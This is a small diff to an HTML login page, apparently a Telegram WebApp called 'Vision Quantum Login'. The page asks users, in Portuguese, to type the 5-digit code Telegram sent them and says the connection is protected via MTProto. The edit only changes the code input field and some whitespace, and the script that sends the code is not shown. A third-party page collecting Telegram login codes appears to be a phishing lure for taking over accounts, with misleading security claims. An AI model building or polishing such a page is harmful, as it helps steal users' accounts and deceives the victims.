@@ -11,11 +11,10 @@
 </head>
 <body>
     <h3>Vision Quantum Login</h3>
-    <p>Digite o código de 5 dígitos enviado pelo Telegram:</p>
-    <input type="number" id="codigo" placeholder="00000" maxlength="5">
-    <button onclick="enviar()">CONECTAR CONTA</button>
-    <p class="status">Sua conexão é protegida via MTProto</p>
-
+ <input type="tel" id="codigo" placeholder="00000" maxlength="5" pattern="\d*">
+<button onclick="enviar()">CONECTAR CONTA</button>
+<p class="status">Sua conexão é protegida via MTProto</p>
+   
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
